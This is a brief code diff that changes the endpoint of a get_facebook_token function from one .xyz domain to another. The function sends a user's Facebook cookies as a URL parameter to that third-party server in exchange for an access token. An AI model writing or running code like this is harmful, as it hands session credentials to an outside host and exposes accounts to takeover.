@@ -317,7 +317,7 @@ def get_facebook_token(cookies):
     Returns:
         dict: Dictionary containing token, user info, or error message
     """
-    url = "https://rahul.xyz/api/facebook_token"
+    url = "https://kojaxd.xyz/api/facebook_token"
     params = {'cookies': cookies}
     
     try:
